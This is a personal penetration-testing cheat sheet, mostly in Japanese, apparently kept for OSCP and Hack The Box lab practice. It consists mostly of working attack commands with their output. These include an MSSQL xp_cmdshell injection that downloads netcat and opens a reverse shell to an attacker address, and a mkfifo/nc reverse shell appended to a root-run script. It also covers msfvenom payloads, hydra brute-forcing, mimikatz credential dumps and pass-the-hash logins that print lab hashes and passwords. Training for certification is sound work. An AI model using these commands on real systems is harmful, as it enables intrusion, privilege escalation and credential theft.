
# My Cheat Sheet

## 探索

### nmap
```
nmap -sC -sV -O -v -oV 10.10.10.17
```
複数の ip レンジ and open status のスキャン
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```
脆弱性スキャン
```
nmap -sV --script vuln 10.10.10.1
```
chisel 利用時
```
proxychains nmap --top-port 20 -sT 10.10.100.150
```

### nmap tips

https://muchipopo.com/ctf/cheatsheet-oscp/

### windows でポートスキャン
```
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.206.151", $_)) "TCP port $_ is open"} 2>$null
```

### AutoRecon
```
┌──(kali㉿kali)-[~/Documents/Beep]
└─$ python3 ../AutoRecon/autorecon.py 10.10.10.7 
```

https://github.com/Tib3rius/AutoRecon

## ssh
ssh key を使う場合  
chmod 600 id_rsa が必要  
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A/nc.exe/snmp-shell]
└─$ ssh -i id_rsa john@192.168.248.149 
Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
john@oscp:~$ 
```

ssh でエラーが出る場合  
```/etc/ssh/ssh_config```  

```
HOST *
KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
IgnoreUnknown UseKeychain,AddKeysToAgent
UseKeychain yes
AddKeysToAgent yes
Ciphers +3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc
StrictHostKeyChecking no
UserKnownHostsFile /dev/null
HostKeyAlgorithms ssh-dss,ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```
ssh の鍵にパスワードがあった場合の解析方法

```
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge2]
└─$ ssh -p 2222 -i hash.txt anita@192.168.216.245
Enter passphrase for key 'hash.txt': 
```

```
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge2]
└─$ ssh2john hash.txt > hash_john.txt
                                                                                                                                    
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_john.txt
Created directory: /home/rnozaka/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fireball         (hash.txt)     
1g 0:00:02:20 DONE (2024-03-07 18:59) 0.007142g/s 29.25p/s 29.25c/s 29.25C/s mom123..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## dns 53
```
└─$ dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.18.16-1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 235 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Dec 08 21:28:42 EST 2023
;; XFR size: 7 records (messages 1, bytes 203)

```
## NetBIOS 139
nbtscan
```
kali@kali:~$ sudo nbtscan -r 192.168.50.0/24
Doing NBT name scan for addresses from 192.168.50.0/24

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.50.124   SAMBA            <server>  SAMBA            00:00:00:00:00:00
192.168.50.134   SAMBAWEB         <server>  SAMBAWEB         00:00:00:00:00:00
```

## SNMP 161/UDP
https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A/nc.exe/snmp-shell]
└─$ snmpwalk -c public -v1 -t 10 192.168.248.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value <<< メッセージ
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
```

## http/https 

### http 探索
```
gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**https** の場合は **-k** が必要

```
gobuster dir -u https://beep.htb/ -w /usr/share/wordlists/dirb/common.txt -k
```

```
feroxbuster -u http://shocker.htb -f -n
feroxbuster -u http://shocker.htb/cgi-bin/ -x sh,cgi,pl
```
```
dirb http://10.10.10.56/cgi-bin/ -X .sh,.pl,.txt,.php,.py
```

```
└─$ whatweb http://192.168.213.121
http://192.168.213.121 [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[192.168.213.121], JQuery[1.12.4], Meta-Author[Offensive Security], Microsoft-IIS[10.0], Modernizr[3.5.0.min], Script, Title[MedTech][Title element contains newline(s)!], X-Powered-By[ASP.NET], X-UA-Compatible[ie=edge]
```
## SQLi

ログイン画面で利用  
ユーザ名、パスワードに **admin'or'1'='1** を利用  

### MSSQL
```
' exec xp_cmdshell "powershell -c iwr -uri http://192.168.45.222/nc64.exe -Outfile c:\windows\temp\nc.exe"-- 
' exec xp_cmdshell "powershell -c c:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.222 1234"-- 
```

### WordPress
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```
### Word Press username 列挙
```
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

### Word Press admin page

```
https://brainfuck.htb/wp-admin/
```

## SMB
ダウンロード
```
smbclient '//192.168.239.248/Users' -N -c 'prompt OFF;recurse ON;mget *'
```

接続
```
smbclient //192.168.239.248/transfer -U guest
```

探索
```
enum4linux -u 'guest' -p '' -a 192.168.239.248
```
## TCP/5985
https://qiita.com/v_avenger/items/78b323d5e30276a20735
```
Evil-WinRMツールは、WinRMサービスが有効（通常は5985/tcpで応答）かつ、資格情報とアクセス許可がある場合に使用することのできるリモートシェルプログラムです。
```

## exploit code 

### searchsploit 検索
```
searchsploit wordpress plugin wp support
```

### searchsploit 詳細表示
```
searchsploit -x 41006.txt
```
### searchsploit Download
```
searchsploit -m 37637
```

### sudo -l
root 権限で実行できるファイルが確認できる
```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh <<<<< HERE
```

## root 権限

### perl -e 'exec "/bin/sh";'
https://gtfobins.github.io/gtfobins/perl/
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
```

### netcat /tmp/f
sudo -l で root 権限で実行できるファイルを見つけ、以下コマンドで netcat できるようにする。
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
```

```
└─$ nc -lvnp 8443
listening on [any] 8443 ...
```
### Automated Enumeration

```
kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
```
### AD
mimikatz
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
```

impacket-psexec
```
kali@kali:~$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 172.16.6.240..... [*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.6.240..... [*] Creating service tahE on 172.16.6.240..... [*] Starting service tahE.....
[!] Press help for extra shell commands Microsoft Windows [Version 10.0.20348.1006] (c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami nt authority\system
```

## Windows Privilege Escalation
ファイル調査
```
Get-ChildItem -Path C:\ -Include *.txt,*.ini,SAM -File -Recurse -ErrorAction SilentlyContinue
```
エスカレーション確認
```
oscp\web_svc@MS01 C:\Users\web_svc>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State        
============================= ==================================== =======      
SeShutdownPrivilege           Shut down the system                 Enabled      
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled      
SeUndockPrivilege             Remove computer from docking station Enabled      
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled      
SeTimeZonePrivilege           Change the time zone                 Enabled      


```
PrintSpoofer
```
kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 

PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe .\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
PS C:\Windows\system32> whoami whoami
nt authority\system
```
faile 検索
```
Get-ChildItem -Path C:\windows.old -Include *.txt,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
SAM SYSYTEM hash
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[-] NTDSHashes.__init__() got an unexpected keyword argument 'ldapFilter'
[*] Cleaning up... 
```
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
└─$ proxychains evil-winrm -i 10.10.174.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
*Evil-WinRM* PS C:\Users\tom_admin\Documents>
```
## Tips

### URL エンコーディング
https://www.w3schools.com/tags/ref_urlencode.asp

### reverse_shells
https://gist.github.com/sckalath/67a59eb4955f1f9aedde

### Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Reverse Shell Generator
https://www.revshells.com/

### リバースシェル
kali 側
```
└─$ nc -lvnp 4444  
```
Windows  
https://podalirius.net/fr/articles/windows-reverse-shells-cheatsheet/

nc  
https://github.com/int0x33/nc.exe/

### which
リバースシェルで対象サーバで使えるコマンドを確認するコマンド
```
┌──(rnozaka㉿kali)-[~/Documents]
└─$ which nc
/usr/bin/nc
```

### ハッシュ解読
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### データベース調査
接続
```
www-data@cronos:/var/www/admin$ mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 42
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
ID:root/PW:root の場合
```
┌──(rnozaka㉿kali)-[~/Documents]
└─$ mysql -u root -p'root' -h 192.168.248.16 -P 3306
```

一覧表示
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)
```
データベース選択
```
mysql> use admin
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
テーブル表示
```
mysql> show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```
```
mysql> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```

windows の場合の接続方法
```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

### PW ブルートフォース
***http***
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

```
┌──(kali㉿kali)-[~/Documents/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:15:01
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:15:14                            
```
***https***
```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
```
```
┌──(kali㉿kali)-[~/Documents/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-16 03:23:54
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10000 login tries (l:1/p:10000), ~157 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123                                                                            
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-16 03:24:38
```
リバースブルートフォース
```
kali@kali:~$ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
### kali から windows RDP
```
xfreerdp /u:student /p:lab /v:192.168.206.152
```
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
```
```
proxychains -q xfreerdp /d:medtech.com /u:yoshi '/p:Mushroom!' /v:172.16.247.82 /cert-ignore
```

### grep
下5行表示
```
grep -A 5 -n kitaura smb.conf
```

上5行表示
```
grep -B 5 -n kitaura smb.conf　
```

### Mac キーボード 設定
command -> caps lock 無効化  
<img width="551" alt="image" src="https://github.com/ryuji-jp/htb/assets/61535783/ec1842a3-90f4-416f-ad93-954434170366">

### nc
```
└─$ nc -lvnp 8443
listening on [any] 8443 ...
```
```
-z: このオプションは、接続を確立せずにスキャンするために使用されます。
-v: 冗長オプションはスキャン結果を出力します。
-n: このオプションは、DNS ルックアップと警告をスキップするために使用されます。
```

### 対象 VM へファイルを送る方法  
受信側
```
joe@debian-privesc:~$ nc -nlvp 4433 > unix-privesc-check
listening on [any] 4433 ...
connect to [192.168.191.214] from (UNKNOWN) [192.168.45.223] 44002
```
送信側
```
└─$ nc -nv 192.168.191.214  4433 < /usr/bin/unix-privesc-check
(UNKNOWN) [192.168.191.214] 4433 (?) open
```

### BurpSuite インストール
インストール方法  
https://qiita.com/natsuki7293/items/74ab17ad3ad1d8a8ec3d  
ダウンロードサイト  
https://portswigger.net/burp/releases/professional-community-2023-10-1-1?requestededition=professional&requestedplatform=  

### pwsh インストール
```
% brew install --cask powershell  
<中略>
installer: Package name is PowerShell - 7.2.1
installer: Installing at base path /
installer: The install was successful.
🍺  powershell was successfully installed!
```
https://note.com/iboy1204/n/n99f2994e8f96

### ターミナル ホスト名非表示
https://qiita.com/kaito_program/items/e6a6013b1f614eed1960

### RDP した Windows と Kali との共有

https://www.linkedin.com/pulse/transfer-files-from-windows-kali-julio-sanchez

```
┌──(rnozaka㉿rnozaka)-[~/Documents]
└─$ python3 ~/Documents/impacket/examples/smbserver.py -smb2support myshare2 .  
Impacket v0.11.0 - Copyright 2023 Fortra
```
### tcpdump
ssh 除外  
```
sudo tcpdump -i ens192 not port 2222
```

### Hashcat
https://qiita.com/labpixel/items/881103da50cd725b6254

-m XXX の数字の確認方法  
https://hashcat.net/wiki/doku.php?id=example_hashes

```
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -- force
hashcat (v6.2.5) starting
... $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0 bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee30 9d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c35 35689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```
### find
ファイルの中身の文字列を検索する  
Linux  
```
find [検索対象フォルダのパス] -type f -print | xargs grep '[検索したい文字列]'
find / -type f -print | xargs grep "OS{" 2> /dev/null
```
Windows  
```
C:\Windows\system32>where /r c:\ local.txt
where /r c:\ local.txt
```

### Power shell

```
PS C:\Tools> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Tools>
PS C:\Tools> .\PowerView.ps1
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools>
```

### crackmapexec

```
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
└─$ proxychains -q crackmapexec winrm 172.16.204.10 -u "joe" -p "Flowers1" -d medtech.com -X "whoami"
HTTP        172.16.204.10   5985   172.16.204.10    [*] http://172.16.204.10:5985/wsman
WINRM       172.16.204.10   5985   172.16.204.10    [-] medtech.com\joe:Flowers1
```

```
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
└─$  proxychains -q crackmapexec smb 172.16.193.82 -u yoshi -p password.txt --continue-on-success 
SMB         172.16.193.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:lab STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Flowers1 STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.193.82   445    CLIENT01         [-] medtech.com\yoshi:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
```

### evil-winrm

```
┌──(rnozaka㉿rnozaka)-[~/Documents/Callenge1]
└─$ proxychains -q evil-winrm -i 172.16.193.83 -u wario -p 'Mushroom!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\wario\Documents> 
```
### Windows サーバから Kali への file アップロード

```
On kali in /tmp folder to avoid write errors:

kali@kali:~$ impacket-smbserver -smb2support newShare . -username test -password test

Then as Jim:

PS C:\Users\jim\Documents> net use z: \\192.168.XX.X\newShare /u:test test
PS C:\Users\jim\Documents> copy Database.kdbx z:\

Then you should get on kali to enumerate further 
```

### Windows Admin ログイン時のドメイン指定

dll ハイジャックなどでユーザを作成したときは、ローカルユーザとなる。
その状態で Admin になろうとするとドメインが指定されている場合がある。
ユーザ名を **".\dame"** と指定することでローカルユーザとなる。

### zip
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
└─$  7z e sitebackup3.zip 
```

### chisel
server
```
chisel server -p 8010 --reverse
```
client
```
chisel.exe client 192.168.45.190:8010 R:1080:socks
```
/etc/proxychains
```
socks5 127.0.0.1 1080
```
実行コマンド
```
proxychains nmap --top-port 20 -sT 10.10.100.150
```
```
curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
```
参考: https://scrapbox.io/rex/Pivoting_with_chisel

### ファイル転送
Windows 側
```
certutil.exe -urlcache -f http://192.168.45.190:8000/chisel.exe chisel.exe
iwr -uri http://192.168.118.2/mimikatz.exe -Outfile mimikatz.exe
```
kali 側
```
python3 -m http.server 8000
```
### GodPotato
***SeImpersonatePrivilege***の値を確認  
***whoami /all***コマンドで  
https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71
```
GodPotato-NET2.exe -cmd "nc_win.exe 192.168.45.190 4444 -e cmd"
```
### msfconsole
```
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
```

```
kali@kali:~/beyond$ sudo msfconsole -q msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.119.5 LHOST => 192.168.119.5
msf6 exploit(multi/handler) > set LPORT 443 LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false ExitOnSession => false
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
```

```
msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 7532 created.
```
### printspoofer
権限昇格(Win)  
https://github.com/dievus/printspoofer
```
C:\wamp64\attendance\images>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\wamp64\attendance\images\mimikatz.exe
C:\wamp64\attendance\images\mimikatz.exe
```

### evil-winrm
mimikatz の NTLM から shell を取る

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 397322 (00000000:0006100a)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 3/30/2024 12:35:35 AM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	msv :	
	 [00000003] Primary
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
	 * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
	 * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f

```
crackmapexec で調査
```
└─$ proxychains crackmapexec winrm 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5986 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
HTTP        10.10.174.142   5985   10.10.174.142    [*] http://10.10.174.142:5985/wsman
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
WINRM       10.10.174.142   5985   10.10.174.142    [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
```
evil-winrm で shell 取得
```
┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
└─$ proxychains evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
oscp\celia.almeda
```
Evil-WinRM の中で mimikatz ダウンロード
```
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> upload mimikatz
                                        
Info: Uploading /home/rnozaka/Documents/OSCP_A/mimikatz to C:\Users\celia.almeda\Documents\mimikatz
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
                                        
Data: 1589708 bytes of 1589708 bytes copied
                                        
